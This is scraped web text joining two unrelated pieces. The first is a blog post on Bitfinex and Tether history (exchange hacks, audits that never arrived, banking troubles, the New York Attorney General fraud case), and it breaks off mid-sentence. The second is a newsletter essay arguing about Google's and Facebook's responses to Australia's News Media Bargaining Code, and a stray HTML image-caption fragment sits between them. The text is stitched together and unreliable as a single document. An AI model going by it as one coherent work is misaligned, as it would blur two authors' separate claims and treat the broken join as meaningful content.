<p>Bitfinex was <a href="https://www.bbc.com/news/technology-37009319">first hacked in May 2015</a> (<a href="https://web.archive.org/web/20201209020249/https://www.bbc.com/news/technology-37009319">archive</a>).  It was just 1500 Bitcoins from their hot wallet and they covered it out of their corporate funds. This did little to affect the general confidence in Bitfinex and it retained its position as one of the largest exchanges.  Bitfinex’s position became more complicated when in June of 2016 the CFTC ordered Bitfinex to pay a $75,000 fine for “<a href="https://web.archive.org/web/20180620074228/https://www.cftc.gov/PressRoom/PressReleases/pr7380-16">offering illegal off-exchange financed retail commodity transactions in bitcoin and other cryptocurrencies</a>“.  Part of the issue was that the Bitcoins were not “physically delivered” from the perspective of the CFTC.  This may have been a motivating factor for Bitfinex’s switchover to BitGo for their wallet security.  <a href="https://www.coindesk.com/bitfinex-bitcoin-hack-know-dont-know">BitGo would have allowed for them to segregate each user’s balance</a> (<a href="https://web.archive.org/web/20201209022839/https://www.coindesk.com/bitfinex-bitcoin-hack-know-dont-know">archive</a>).  It was also supposed to provide them with significantly improved multi-signature security.  Then they were hacked again in August 2016.  This was one of the largest Bitcoin hacks of all time totally 119,756 BTC.  In response to this hack, Bitfinex gave the majority of their clients a 30.67% haircut (at least one customer was excluded, <a href="https://twitter.com/nathanielpopper/status/933130228175552513">Coinbase</a>[<a href="https://web.archive.org/web/20201209023544/https://twitter.com/nathanielpopper/status/933130228175552513">archive</a>]).  They credited each customer with a BFX token that represented $1 of the haircut.  They said they would pay back all BFX tokens eventually or would offer equity in exchange for them.  Bitfinex promised to provide a security audit and a <a href="https://www.bitfinex.com/posts/135">financial audit</a> (<a href="https://web.archive.org/web/20201209024343/https://www.bitfinex.com/posts/135">archive</a>).  They did not.  Many of these BFX tokens were converted to equity in Bitfinex, and these users became passionate advocates for Bitfinex.  Eventually all tokens were paid off or converted.</p>



<p>Tether was hacked once as well.  In November 2017, <a href="https://tether.to/tether-critical-announcement/">$30,950,010</a> (<a href="https://web.archive.org/web/20201209025631/https://tether.to/tether-critical-announcement/">archive</a>) Tethers were removed from their wallet.  In order to respond to this Tether <a href="https://twitter.com/dexx7y/status/1046999405449162752">forced</a> (<a href="https://archive.li/ow1WR">archive</a>) a hard fork of the Omni Protocol to mark those Tethers as no longer valid. Eventually Omni added a feature that allowed for transactions to be frozen by the issuer, an ability that Tether maintains to this day.</p>



<p>One of the most commonly voiced frustrations with Tether is that they have never provided a true and full financial audit to prove that they were backed. Tether for years promised that they would get an audit and have yet to follow through.  Early on in their history they did have attestations from a Taiwanese accounting firm [<a href="https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20161231.pdf">12/16</a> (<a href="https://web.archive.org/web/20180608165825/https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20161231.pdf">archive</a>), <a href="https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20170131.pdf">1/17</a> (<a href="https://web.archive.org/web/20180608165847/https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20170131.pdf">archive</a>), <a href="https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20170228.pdf">2/17</a> (<a href="https://web.archive.org/web/20201209030804/https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20170228.pdf">archive</a>), and <a href="https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20170331.pdf">3/17</a> (<a href="https://web.archive.org/web/20201209030842/https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20170331.pdf">archive</a>)].  Due to banking difficulties in Taiwan (we will get back to this) they stopped this relationship.  They then hired Friedman LLP in New York for promised <a href="https://tether.to/tether-update/">“comprehensive balance sheet audits on a quarterly basis going back to Dec. 31, 2016. We will share those results with you as they become available in the coming weeks or month.”</a> (<a href="https://web.archive.org/web/20201209031130/https://tether.to/tether-update/">Archive</a>)  This audit (like the promised Bitfinex audit) never arrived.  Tether said the following in response to this relationship ending, <a href="https://www.coindesk.com/tether-confirms-relationship-auditor-dissolved">“We confirm that the relationship with Friedman is dissolved.&nbsp;&nbsp;Given the excruciatingly detailed procedures Friedman was undertaking for the relatively simple balance sheet of Tether, it became clear that an audit would be unattainable in a reasonable time frame.”</a> (<a href="https://web.archive.org/web/20201209031423/https://www.coindesk.com/tether-confirms-relationship-auditor-dissolved">Archive</a>)  Tether did release a memo from Friedman that was explicitly <a href="https://tether.to/wp-content/uploads/2017/09/Final-Tether-Consulting-Report-9-15-17_Redacted.pdf?__cf_chl_jschl_tk__=0373e80d4605b2403e4fa9ad178b59f58332e003-1607482972-0-AXwPytlF2ASiAPHNVyFGCJ0LzggZ5e42AZzl1D1SgWRpnkY3Ax7fbGPzlbHbkcNqXlTurC1OX3n-4RAq6wIpqdl0eKH4mhd2XryfOODH6hYHAEygAyoYCFwNnw0PQdoSSGxzNDi6a1wr2IRskMsIXd6BawH5IUiokknVrvtKZtm4_BqD1b70YalyCuPuQJurkzAyjO3gbqEb3jsNVNZFXsxVfpwS969ys3dk1W4smwOqEIwiMMGtLYnf0EobcSdMD-RVj2geKymVBJP-oG3p5jgRVhwRK0Zer7itaokNKEhTheoEW3Yji_10RKZF4Qfq2Lm4AgOQsE1KjhoIif5LNU2F4-HmHG6WZqm10j2PSLFToE836a11X9Yx7AdZXyZ_4nYW5lylIJsvldUgvq3wQsMFrZ152DHaH5n6FKEjzrlH">not meant to be relied upon</a>.

The next update (which was still not an audit) came not from an accounting firm, but from a law firm.  Tether engaged Freesh, Sporkin, and Sullivan LLP to review their bank accounts and provide a letter saying that the number of dollars in the bank was greater than the number of <a href="https://tether.to/wp-content/uploads/2018/06/FSS1JUN18-Account-Snapshot-Statement-final-15JUN18.pdf">Tethers in circulation</a> (<a href="https://web.archive.org/web/20201209032159/https://tether.to/wp-content/uploads/2018/06/FSS1JUN18-Account-Snapshot-Statement-final-15JUN18.pdf">archive</a>).  It is important to note that again this document does not seem to have been meant for public release.  Since this update there has been no more review of Tether’s backing (we’ll come back to this).</p>



<p>Against this backdrop both Bitfinex and Tether struggled with their banking.  This started in April 2017 when Wells Fargo, the correspondent bank for Tether and Bitfinex’s Taiwanese banks, cut off their withdrawals.  Since then Bitfinex and Tether have jumped from bank to bank.  They briefly banked at Noble Bank International an international financial entity that was founded by Brock Pierce and John Betts (an investor most noted for trying to buyout Mt Gox).  After Noble faced financial difficulties Tether landed at Deltec bank.  </p>



<p>Due to Bitfinex’s difficulties in securing and maintaining banking they partnered with <a href="https://bennettftomlin.com/2020/11/07/a-list-of-companies-who-worked-with-crypto-capital/">Crypto Capital Corp</a>.  Crypto Capital Corp was run by <a href="https://www.justice.gov/usao-sdny/pr/arizona-man-and-israeli-woman-charged-connection-providing-shadow-banking-services">Reggie Fowler and Ravid Yosef</a> (<a href="https://web.archive.org/web/20201209033930/https://www.justice.gov/usao-sdny/pr/arizona-man-and-israeli-woman-charged-connection-providing-shadow-banking-services">archive</a>).  Reggie Fowler has been arrested on bank fraud charges, and Ravid Yosef is still on the run.  </p>



<p>Shortly before the news broke about the charges and arrest of Reggie Fowler the New York Attorney General revealed that they were investigating Tether and Bitfinex for <a href="https://iapps.courts.state.ny.us/fbem/DocumentDisplayServlet?documentId=vIexA1b0spKOnK_PLUS_ZUGTJ3A==&amp;system=prod">fraud</a> (<a href="https://web.archive.org/web/20201209034305/https://iapps.courts.state.ny.us/fbem/DocumentDisplayServlet?documentId=vIexA1b0spKOnK_PLUS_ZUGTJ3A%3D%3D&amp;system=prod">archive</a>).  Several shocking details were revealed in this investigation (some of which I have covered <a href="https://bennettftomlin.com/2020/02/13/analysis-of-december-nyag-and-tether-filings/">here</a>, <a href="https://bennettftomlin.com/2019/05/21/key-excerpts-and-commentary-from-nyag-tether-court-transcript/">here</a>, <a href="https://bennettftomlin.com/2020/12/06/analysis-of-the-new-york-supreme-court-remittitur-in-the-tether-and-bitfinex-new-york-attorney-general-case/">here</a>), including that Bitfinex had given $1 bn to Crypto Capital and had not even signed a contract.  When Crypto Capital stopped serving Bitfinex’s withdrawal requests (which Bitfinex actively was lying about), Bitfinex exchanged $625 mn of their ‘book’ dollars in Crypto Capital for money that Tether had in their bank account in order to service withdrawals.  This in effect made Tether insolvent.  This happened before Tether changed their promise from fully backed by cash. After this Bitfinex entered into a credit agreement with Tether wherein Tether extended a loan of up to $900mn to Bitfinex.  The loan was secured by iFinex shares which were owned by Digfinex the parent company for both Tether and Bitfinex.  The NYAG report includes the following line, “The transaction documents were signed on behalf of Bitfinex and Tether by the same two individuals.  Those two individuals are also directors and owners of Digfinex, Bitfinex and Tether.”  (See the postscript for some other things that were discovered when the NYAG released the order.)</p>



<p>When news of this effective insolvency broke, Bitfinex responded by creating a new token called <a href="https://www.bitfinex.com/wp-2019-05.pdf">UNUS SED LEO</a> (<a href="https://web.archive.org/web/20201209040248/https://www.bitfinex.com/wp-2019-05.pdf">archive</a>) or Leo from here on out.  They intended to sell 1 billion tokens, each for a dollar, in order to help close out the loan facility. (All tokens were sold but the loan facility has not been paid off.)  The token provided some discounts on Bitfinex’s platform to it’s holder.  However, most of its potential value derviced from the other promises they made including that they would buy back an amount of LEO equal to 27% of their (unaudited) revenue each month, or their promise to use 95% of the net recovered funds from Crypto Capital to buy and burn LEO.  </p>



<p>Since then Tether’s size has absolutely exploded with it growing to nearly $20,000,000,000.  Bitfinex and Tether are still under investigation by the NYAG, but have had their appeal rejected and they will be moving to <a href="https://bennettftomlin.com/2020/12/06/analysis-of-the-new-york-supreme-court-remittitur-in-the-tether-and-bitfinex-new-york-attorney-general-case/">trial soon</a>.</p>



<p>This is far from an exhaustive look at Tether (I’m working on a book with <a href="https://twitter.com/CasPiancey">CasPiancey</a> for that), but hopefully you have a better understanding of the …</p></div></div>

Photo by Joey Csunyo / Unsplash"></a><figcaption>Joey Csunyo / Unsplash</figcaption></figure></div><p>Yesterday, I wrote that <a href="https://www.platformer.news/p/australias-bad-bargain-with-platforms">Australia’s News Media Bargaining Code threatened to splinter the internet</a>. On Wednesday morning, the splintering arrived: Google cut a deal with News Corp. that will ensure its services continue to be provided in Australia, and Facebook walked away from the bargaining table and began preventing people from sharing news links from Australian publishers around the world. </p><p>I think Facebook basically did the right thing, and Google basically did the wrong thing, even though Google had a much tougher call to make. Today, let’s talk about why the tech giants made the decisions that they did, why Australia’s shakedown is rotten, and what’s likely to happen next. (If you didn’t <a href="https://www.platformer.news/p/australias-bad-bargain-with-platforms">read my piece on the subject yesterday</a>, it offers a lot of useful context for what follows. I’ve made it free for all subscribers to read.)</p><p>In development for three years, the bargaining code is intended to give Australia’s heavily concentrated media industry more leverage as publishers seek direct payment from Google and Facebook for the right to display links to their work. It does this by forcing the platforms into binding arbitration with publishers who bring cases, and puts the decision for how much the platform has to pay the publishers into the hands of the arbiter. Each side throws out a number, and the arbiter picks the one they think is most fair. </p><p>(The arbiter does <em>not</em> pick a number in between, by the way; I got that wrong yesterday and have corrected the post.)</p><p>By design, the arbitration process favors the publisher. Also by design, it encourages platforms to avoid the process altogether by signing one-off deals with individual publishers in hopes that they can get better terms that way. </p><p><strong>I. Google</strong></p><p>Over the past few days, Google has been signing deals with the biggest publishers in Australia for exactly this reason. <a href="https://www.businessinsider.com/google-australia-news-technology-seven-west-media-2021-2#:~:text=Google%20signed%20up%20a%20major,force%20payments%20to%20media%20outlets.">Seven West Media got a deal</a>, <a href="https://www.theguardian.com/media/2021/feb/17/nine-agrees-to-join-google-news-showcase-in-australia-for-reported-30m-a-year#:~:text=Australia's%20biggest%20locally%2Downed%20media,laws%20being%20debated%20in%20parliament.">Nine Entertainment got a deal</a>, and on Wednesday, one of the country’s biggest conglomerates — Rupert Murdoch’s News Corp. —&nbsp;got its deal. In exchange for an undisclosed sum, Google will feature News Corp. articles in its News Showcase product in Australia and beyond.</p><p>“Among the News Corp publications joining Google News Showcase will be the<em> Wall Street Journal</em>, <em>Barron’s</em>, <em>MarketWatch</em>, and the <em>New York Post</em>; in the UK: the<em> Times</em> and the <em>Sunday Times</em>; and the <em>Sun</em>; and in Australia a range of news platforms, including the <em>Australian</em>, news.com.au, Sky News, and multiple metropolitan and local titles,” the company told me in a statement.</p><p>As announced, the deals pertain to <a href="https://blog.google/outreach-initiatives/google-news-initiative/google-news-showcase/">Google News Showcase</a>, a tab within Google News that contains licensed content from official partners. But the people I’ve spoken with are operating under the assumption that if there’s a deal between Google and a big publisher in Australia, that publisher either can’t or won’t be dragged to arbitration for showing links and snippets of text in search results.</p><p>Search, of course, is what Google cares about the most, and explains why the company caved. Removing links to news&nbsp;stories from Google would break the search engine in Australia, <a href="https://blogs.microsoft.com/on-the-issues/2021/02/11/endorsement-australias-proposal-technology-news/">opening it up to rivals</a>. And so the company signed a bunch of deals under duress. </p><p>(It’s worth mentioning that any Australian publisher aggrieved by an unfair exchange of value with Google here could opt out of search results&nbsp;at any time by adding one line of HTML to their website. But almost none of them do, because traffic from Google drives significant advertising and subscription revenue to them.)</p><p>With its moves today, Google has now invited every other country to pursue a similar protection racket. Parliament members in Canada and the European Union have already endorsed measures similar to Australia’s. And a basic tenet of the open web — that hyperlinks can be freely displayed on any website —&nbsp;just took a body blow.</p><p>I’d feel better about this if publishers said a single word about how much of their new Google revenue that they planned to spend on journalists’ salaries, or news gathering. </p><p>They didn’t, though, and why would they? Australia’s bargaining code doesn’t say one word about requiring that any of this money be spent on journalism, either.  </p><p><strong>II.</strong> <strong>Facebook</strong></p><p>Unlike Google, Facebook’s core service doesn’t rely heavily on news articles. The company estimates that only about 4 percent of posts on the network are works of journalism. It is not all that hard to imagine opening up Facebook and scrolling for a few minutes, never to see a link to a news article at all —&nbsp;and in fact, millions of people do this every day.</p><p>And so it is perhaps less surprising that when Google blinked at Australia’s demand, Facebook walked away. Here’s William Easton, <a href="https://about.fb.com/news/2021/02/changes-to-sharing-and-viewing-news-on-facebook-in-australia/">Facebook’s managing director for Australia and New Zealand</a>:</p><blockquote><p>While the government has made some changes, the proposed law fundamentally&nbsp;<a href="https://australia.fb.com/post/our-response-to-australias-proposed-news-media-laws/">fails to understand</a>&nbsp;how our services work.</p><p>Unfortunately, this means people and news organisations in Australia are now restricted from posting news links and sharing or viewing Australian and international news content on Facebook. Globally, posting and sharing news links from Australian publishers is also restricted. To do this, we are using a combination of technologies to restrict news content and we will have processes to review any content that was inadvertently removed.</p></blockquote><p>And just like that, news articles originating in Australia disappeared from Facebook.</p><p>Easton says that in the past year, Facebook sent more than 5 billion clicks to Australian publishers, whose value he estimated at AU$ 407 million. If the current situation holds, Facebook will send those same publishers zero clicks —&nbsp;a move that, I imagine, may force publishers to recalibrate in their minds the relative value that Facebook and publishers provide one another.</p><p>Of course, many critics were apoplectic that Facebook had taken this move, calling it <a href="https://twitter.com/matthewstoller/status/1362135211606220800?s=20">a vile act of censorship</a>, <a href="https://twitter.com/JuddLegum/status/1362172282102304769">unchecked greed</a>, and <a href="https://twitter.com/evelyndouek/status/1362171044136710144">destruction of the public sphere</a>. </p><p>Certainly the execution of the ban left something to be desired. </p><p>Rather than building a blacklist of news sites to restrict, Facebook tried using its machine learning systems to identify news publishers, and the systems went <a href="https://www.abc.net.au/news/2021-02-18/bom-health-authorities-betoota-caught-in-facebook-news-ban/13166394?section=technology">predictably haywire</a>. There were reports that government and emergency pages, nonprofit groups, and the Bureau of Meteorology <a href="https://twitter.com/maxchalm/status/1362160410984476672?s=21">could no longer share</a>. Given how long the possibility of restricting links has loomed, you’d think Facebook would have better prepared for it to arrive.</p><p>And while I don’t want to make light of these mistakes, to the extent that they teach Facebook’s user base to seek their news elsewhere, they can serve a noble purpose. I don’t know a single journalist who feels comfortable with social networks being anyone’s primary source of news, particularly after years of daily reporting on the misinformation and conspiracy theories that so often thrive on them. And so it is more than a little strange to see so many people insisting that Facebook is obligated to share publishers’ content, on whatever terms those publishers set.</p><p>Some, <a href="https://twitter.com/WillOremus/status/1362132040544628736?s=20">like OneZero’s Will Oremus</a>, have noted that removing high-quality news sources from Facebook will likely mean a boost for lower-quality blog posts, memes, and other junk. That seems fair, and I do think it bears watching. But what if, in the meantime, Australians simply … visit websites? Subscribe to newsletters? Read … books? I realize I sound hopelessly naive here. But if this is the beginning of more people coming to understand the value in visiting trusted news sources directly, I think we’d all be better off. Publishers included!</p><p>In reality, though, I suspect the great Australian news outage of 2021 will be short lived. Australia’s treasurer, a leading figure in the negotiations, <a href="https://twitter.com/joshfrydenberg/status/1362144150712315905?s=21">said he spoke with Mark Zuckerberg today</a>, and that negotiations continue. (<a href="https://www.nytimes.com/2021/02/17/business/media/australia-google-pay-for-news.html">Fun fact from the </a><em><a href="https://www.nytimes.com/2021/02/17/business/media/australia-google-pay-for-news.html">New York Times</a></em>: Australia’s treasurer was also “<a href="https://www.smh.com.au/entertainment/celebrity/ryan-stokes-society-wedding-a-sizzler-20161202-gt30re.html" title="">the best man at the wedding of Ryan Stokes</a>, who is a son of Kerry Stokes, the billionaire owner of Seven West Media, one of the companies that have reached a deal with Google.”)</p><p>“We will continue to engage with the government on amendments to the law, with the aim of achieving a stable, fair path for both Facebook and publishers,” Facebook told me today when I asked for an update.</p><p>In the meantime, though, I’m glad Facebook called publishers’ bluff. </p><p><strong>III. What’s next</strong></p><p>I wish Australia would take Facebook’s rejection as a sign it should rethink its approach to media regulation entirely. It could just tax companies based on their revenues, for example. It could earmark those revenues to support journalism — nonprofit public media, even, <a href="http://www.orangemedianetwork.com/blog/screengaze/the-importance-of-public-broadcasting/article_dda75496-e27e-11e6-a558-2f6b46140340.html">which has consistently been shown to have powerful civic benefits</a>. Or it could pursue a bargaining code that requires big media conglomerates to create and support <em>jobs</em> in journalism, rather than simply accept tens of millions of dollars and spend them however they like — or just return it to shareholders.</p><p>In reality, though, none of that seems likely to happen. Google’s capitulation means that Australian crony capitalism is now likely to be exported worldwide. Legacy media outlets will become richer —&nbsp;and also more dependent on the tech giants that they excoriate daily for having too much power over them. All the while, the media industry will continue to consolidate, and it will be harder to get or keep a job in journalism.</p><p>A bargaining code that truly sought to level the playing field between the platforms and the public would take these realities into account. There is still time to amend it before Parliament takes a vote, and here’s hoping that lawmakers do — both&nbsp;in Australia and beyond it.</p><h3>Message received</h3><p>Y’all really, really prefer the standard linking format. So we’re back to normal today — though I still feel like I could make these feel more valuable somehow; maybe just arranging them differently. I’ll keep you posted, but thanks to everyone who wrote in yesterday with feedback!</p><h3>The Ratio</h3><p><em>Today in news that could affect public perception of the big tech companies.
